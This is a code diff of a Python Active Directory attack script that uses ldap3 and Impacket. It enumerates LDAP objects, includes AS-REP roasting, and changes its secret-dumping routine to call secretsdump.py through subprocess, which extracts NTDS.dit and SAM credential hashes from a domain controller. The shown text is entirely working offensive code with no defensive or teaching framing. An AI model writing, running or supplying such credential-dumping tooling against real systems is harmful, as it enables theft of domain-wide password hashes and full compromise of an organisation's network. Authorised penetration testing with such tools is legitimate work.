@@ -1,7 +1,6 @@
 import argparse
 from ldap3 import Server, Connection, ALL, NTLM, ANONYMOUS
 from impacket.smbconnection import SMBConnection
-from impacket.examples.secretsdump import DumpSecrets
 import subprocess
 
 def connect_to_ad(server_address, domain=None, username=None, password=None):
@@ -22,7 +21,6 @@ def connect_to_ad(server_address, domain=None, username=None, password=None):
     return conn
 
 def enumerate_ldap_objects(conn):
-    # Enumerate users, groups, computers, domain info, etc.
     print("\n[+] Enumerating LDAP objects...")
 
     # Enumerate Domain Info
@@ -153,12 +151,16 @@ def asrep_roasting(target, domain, username):
     except Exception as e:
         print(f"AS-REP Roasting failed: {e}")
 
-def dump_secrets(target, username, password, domain):
+def dump_secrets(server_address, username, password, domain):
     print("\n[+] Dumping Secrets (NTDS.dit, SAM)...")
     try:
-        # Dump secrets using Impacket's secretsdump tool
-        dumper = DumpSecrets(target, username, password, domain, options=None)
-        dumper.dump()
+        # Using subprocess to call the secretsdump.py script
+        command = [
+            'python3', 'secretsdump.py',
+            f'{domain}/{username}:{password}@{server_address}'
+        ]
+        result = subprocess.run(command, capture_output=True, text=True)
+        print(result.stdout)
     except Exception as e:
         print(f"Secrets dumping failed: {e}")
 
